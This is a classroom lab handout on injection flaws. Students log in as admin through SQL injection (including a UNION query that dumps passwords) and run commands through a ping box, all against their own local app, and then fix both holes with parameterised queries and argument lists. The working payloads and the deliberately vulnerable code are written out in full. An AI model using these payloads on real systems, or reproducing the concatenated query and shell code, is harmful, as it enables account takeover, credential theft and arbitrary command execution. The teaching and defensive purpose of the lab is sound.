# Lab — Your words become commands, then take the power away

**Your job, in one hour:** make the app do things you never typed a password for — first **log in
as the administrator with no password at all**, then **run a command on the server** through an
innocent-looking box. Then **close both holes** with the same one-line idea. About 50 minutes, with
your pair.

The last two classes were about *doors*: who are you (the token), and what is yours (the ownership
check). Today is a different bug. It is not about which door you open — it is about **what you
type**, and a server that reads what you typed as a **command** instead of as an **answer**.

!!! abstract "What you hand in — two break-ins, then two fixes"
    1. Proof you logged in as **admin with no password** (SQL injection on the login).
    2. Proof you ran a command (e.g. `id`) through the admin **ping** box (command injection).
    3. Your fixed `login` and `admin_ping`, where the exact same inputs now do nothing.

!!! warning "Only your own app"
    You attack and fix **only** your own NotesApp clone, on your own machine. The accounts and
    grades here are seed data, not real people.

---

## The one idea for the whole hour

The server does its work by building a **sentence** and handing it to something that obeys it — the
**database** (its language is SQL) or the **shell** (its language is OS commands). It builds that
sentence by **gluing your text straight into it**:

```python
query = "... WHERE username = '" + username + "' AND password = '" + password + "'"
cmd   = "ping -c 1 " + host
```

Your text was supposed to be **data** — an answer that fills a blank. But because it is glued in, if
your text contains the sentence's own punctuation (`'`, `--`, `;`), it stops being data and becomes
part of the **command**. That is injection. Keep that one picture in mind through every part.

---

## Part 1 — Log in as admin with no password (≈ 8 min)

Start the app.

```bash
docker compose up -d
```

Open <http://localhost:8080>. The login builds this sentence to ask the database:

```text
Find the user whose name is '〔username〕' and whose password is '〔password〕'
```

You are meant to write a plain name in the username box. Instead, write punctuation.

!!! question "Predict first — commit with your pair"
    You will send `admin' -- ` (that is: `admin`, a single quote, a space, two dashes, a space) as
    the **username**, and any junk as the password. The `'` closes the name blank early; `--` makes
    the database **ignore the rest of the line** — including the whole password check. What do you
    think the server does? Write your guess before you run it.

Send it straight to the login route and keep the cookie:

```bash
# the quote closes the blank; --  comments out "AND password = ..."
curl -s -c admin.jar \
     --data-urlencode "username=admin' -- " \
     --data-urlencode "password=anything" \
     http://localhost:8080/login -o /dev/null -w "HTTP %{http_code}\n"

# are we admin? the admin page only opens for admins:
curl -s -b admin.jar http://localhost:8080/admin | grep -o "<title>[^<]*</title>"
```

!!! danger "Checkpoint — you are the administrator, and you typed no password"
    The admin page opens. The sentence the database actually ran was just *"Find the user whose name
    is admin"* — the `'` cut the blank, the `--` struck out the entire `AND password = ...` part.
    The database never checked a password. This is **SQL injection**, NotesApp flaw #8.

??? tip "Go further (optional) — pull the whole user table with UNION"
    `UNION` lets you bolt your **own** query onto the server's. Because these seed passwords were
    never hashed (remember Class 2), they come back in clear. Send as the username:

    ```text
    zzz' UNION SELECT id, username||':'||password, role FROM users LIMIT 1 --
    ```

    The name the app now greets you with is a real `username:password` pair. One text box, and the
    accounts leak out one row at a time.

---

## Part 2 — Un-glue the query: the fix (≈ 10 min)

Open `web/app.py` and find the login query:

```python
# Flaw #8: SQL injection. Query built by string concatenation, no params.
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '" + username + "' AND password = '" + password + "'"
)
conn = get_db()
cur = conn.cursor()
cur.execute(query)
```

The fix is **not** "ban quotes" — you can never list every bad character. The fix is to **stop
gluing**. Use a **parameterised query**: real blanks (`%s`) that the database fills with your input
**as data, never as grammar**.

```python
    query = "SELECT id, username, role FROM users WHERE username = %s AND password = %s"
    conn = get_db()
    cur = conn.cursor()
    cur.execute(query, (username, password))
```

The `%s` are not string formatting — they are placeholders the database driver fills safely. Your
input goes over in a separate envelope marked *"this is data."* Rebuild and try the **exact** attack
again:

```bash
docker compose up -d --build
curl -s -c admin.jar \
     --data-urlencode "username=admin' -- " \
     --data-urlencode "password=anything" \
     http://localhost:8080/login -o /dev/null -w "HTTP %{http_code}\n"
curl -s -b admin.jar http://localhost:8080/admin | grep -o "<title>[^<]*</title>" || echo "blocked"
```

!!! success "Checkpoint — the injection does nothing now"
    The admin page no longer opens. `admin' -- ` is now treated as a literal username — there is no
    user with that exact name, so login simply fails. The quote is just a quote.

---

## Part 3 — Run a command through the ping box, then fix it (≈ 8 min)

Log in as a **real** admin (`admin` / `admin123`) and open the admin page. It has a **"ping a
host"** box. The server builds a shell command from what you type:

```python
# Flaw #9: command injection
cmd = "ping -c 1 " + host
subprocess.run(cmd, shell=True, ...)
```

The shell obeys `;` as *"now run the next command."* So put a second command after the host.

```bash
curl -s -c a.jar -d "username=admin&password=admin123" http://localhost:8080/login -o /dev/null

# host =  127.0.0.1; id; head -2 /etc/passwd
curl -s -b a.jar \
     --data-urlencode "host=127.0.0.1; id; head -2 /etc/passwd" \
     http://localhost:8080/admin/ping | sed -n 's|.*<pre>\(.*\)</pre>.*|\1|p'
```

!!! danger "Checkpoint — you ran your own commands on the server"
    After the ping output you see `uid=0(root)…` (from `id`) and the first lines of `/etc/passwd`.
    The box was meant to ping a host; the `;` let you run anything. This is **command injection**,
    flaw #9 — the same bug as Part 1, in the shell's language instead of SQL.

**The fix — same shape: don't glue.** Don't call a shell at all. Hand the command as a **list of
arguments**, so `host` is one single argument from start to finish:

```python
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True, text=True, timeout=10,
    )
```

Rebuild and re-run the exact attack:

```bash
docker compose up -d --build
curl -s -b a.jar \
     --data-urlencode "host=127.0.0.1; id; head -2 /etc/passwd" \
     http://localhost:8080/admin/ping | sed -n 's|.*<pre>\(.*\)</pre>.*|\1|p'
```

!!! success "Checkpoint — no command runs any more"
    `id` and `/etc/passwd` are gone. `127.0.0.1; id; head -2 /etc/passwd` is now one weird
    *hostname* — ping just fails to resolve it. There is no shell left to read the `;`.

!!! tip "Defence in depth (optional) — also validate the host"
    Before pinging, reject anything that is not a plain host: `if not re.fullmatch(r"[A-Za-z0-9.-]+",
    host): ...`. The argument list is what **closes** the hole; the check is a second wall.

---

## Part 4 — Prove the real features still work (≈ 4 min)

A fix that breaks the real login or the real ping is not a fix.

```bash
# a real login with a real password still works:
curl -s -c ok.jar -d "username=alice&password=alicepw" http://localhost:8080/login \
     -o /dev/null -w "alice login: HTTP %{http_code}\n"
curl -s -b ok.jar http://localhost:8080/dashboard | grep -o "<title>[^<]*</title>"

# a real ping still works (log in as admin first, reuse a.jar):
curl -s -b a.jar --data-urlencode "host=127.0.0.1" \
     http://localhost:8080/admin/ping | sed -n 's|.*<pre>\(.*\)</pre>.*|\1|p' | head -2
```

!!! success "Checkpoint — normal use is unaffected"
    Alice logs in with her real password. A plain `127.0.0.1` still pings. Only the injected input
    is now inert.

---

## What you hand in

```
INJECTION FIX — NotesApp flaws #8 (SQL injection) and #9 (command injection) closed

  SQLi proof (break):   username  admin' --   logged in as admin, password = ____ (none)
  SQLi fix:             login() uses a parameterised query (%s + tuple), no string gluing
  SQLi proof (closed):  same username now -> ____ (expect: login fails / admin page blocked)

  CmdI proof (break):   host  127.0.0.1; id   returned -> ____ (expect: uid=0(root)...)
  CmdI fix:             admin_ping() uses subprocess.run([...]) list, no shell=True
  CmdI proof (closed):  same host now -> ____ (expect: ping fails, no id output)

  Real use still works: alice login OK [ ]   plain 127.0.0.1 ping OK [ ]
```

Commit your fixed `web/app.py`.

!!! tip "The deeper lesson — never build a command by gluing in user input"
    SQL and the shell were two languages, but one mistake: your text was glued into a command
    string. The same bug waits anywhere text meets an interpreter — a database, a shell, a web page
    (that is **stored XSS**, next class), a file path. The rule is always the same: **pass data as
    data — in its own envelope — never as part of the command.**

---

## Cleanup

```bash
docker compose down     # your data is kept in a volume
```

## Troubleshooting

??? bug "`admin' -- ` still logs me in after the SQLi fix"
    You edited the file but did not rebuild, or you left the old `query = "... '" + username + ...`
    line in place. Run `docker compose up -d --build` and confirm `cur.execute(query, (username,
    password))` — the values must go in the **second argument**, not glued into the string.

??? bug "Real logins fail after the fix (even with the right password)"
    You probably still have `cur.execute(query)` with no tuple, or you wrote `%s` but passed the
    values as one string instead of a 2-item tuple `(username, password)`. The order must match the
    two `%s`.

??? bug "The ping box returns an error / nothing after the fix"
    With the list form, `subprocess.run(["ping","-c","1",host])` expects a bare host like
    `127.0.0.1`. That is correct — a plain host still works; only injected input fails. If *every*
    ping errors, check you removed `shell=True` and are passing a **list**, not a string.

??? bug "`sed`/`grep` shows nothing"
    The template may wrap output differently. Just drop the `| sed ...` pipe and read the raw HTML —
    look for the `<pre>` block with the ping result.

---

??? note "Reference fix (open only if you are stuck or at the timer)"
    `web/app.py`:

    ```python
    # login(): parameterised query — input is data, never grammar
    query = "SELECT id, username, role FROM users WHERE username = %s AND password = %s"
    conn = get_db()
    cur = conn.cursor()
    cur.execute(query, (username, password))
    ```

    ```python
    # admin_ping(): no shell, a list of arguments — host is one single argument
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True, text=True, timeout=10,
    )
    ```

    Both fixes are the same idea: stop gluing user input into a command string. The database driver
    treats the tuple values as pure data; the argument list makes `host` one word the shell never
    gets to re-read. (Optional second wall: reject a `host` that is not `[A-Za-z0-9.-]+` before
    running.)
